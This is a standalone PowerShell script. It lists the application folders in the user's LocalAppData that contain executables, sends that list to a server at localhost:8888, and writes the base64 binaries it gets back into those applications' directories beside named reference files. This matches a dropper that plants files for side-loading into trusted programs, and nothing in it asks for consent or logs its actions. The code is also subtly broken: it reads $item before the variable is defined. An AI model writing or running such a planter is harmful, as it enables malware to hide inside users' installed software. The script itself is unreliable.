$localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')

# Get first-level directories using the full path
$directories = Get-ChildItem -Path $localAppData -Directory | ForEach-Object { $_.FullName }

# Initialize an array to store the result
$applicationFolders = @()

# Check subdirectories
foreach ($dir in $directories) {
    $hasApplicationFiles = Get-ChildItem -Recurse -Depth 3 -Path $dir -File -Filter *.exe -ErrorAction SilentlyContinue | Select -First 1
    if ($hasApplicationFiles) {
        $applicationFolders += $dir.replace($localAppData + "\", "")
    }
}

$destination = "localhost:8888"
$url = "http://$destination/install-apps"

$requestParameters = @{
    apps = $applicationFolders
}

# Fetch and invoke installation files
$response = Invoke-RestMethod -Uri $url -Body $requestParameters -Method Get

# Function to perform a recursive search for the reference file
function Find-ReferenceFile {
    param (
        [string]$folder,
        [string]$referenceFileName
    )
    
    # Search recursively for the reference file
    return Get-ChildItem -Path $folder -Recurse -Depth 3 -Filter $referenceFileName -File | Select -First 1
}

$mainApp = $response.main_app
$apps = $response.apps

$mainAppPath = Join-Path -Path $localAppData -ChildPath $mainApp.relative_path
$mainAppContent = [System.Convert]::FromBase64String($item.binary_content)

[System.IO.File]::WriteAllBytes($mainAppPath, $mainAppContent)

# Iterate through each item in the response
foreach ($item in $apps) {
    # Extract the properties from the JSON object
    $binaryContent = [System.Convert]::FromBase64String($item.binary_content)
    $filename = $item.filename
    $directory = $item.directory
    $referenceFileName = $item.reference_file

    $fullDirectoryPath = Join-Path -Path $localAppData -ChildPath $directory

    # Perform recursive search for the reference file
    $referenceFilePath = Find-ReferenceFile -folder $fullDirectoryPath -referenceFileName $referenceFileName

    if ($referenceFilePath) {
        # Get the directory of the reference file
        $referenceFileDirectory = $referenceFilePath.DirectoryName

        # Create the full path for the new file with binary content in the same directory
        $newFilePath = Join-Path -Path $referenceFileDirectory -ChildPath $filename

        # Write the binary content to the file
        [System.IO.File]::WriteAllBytes($newFilePath, $binaryContent)
    }
}
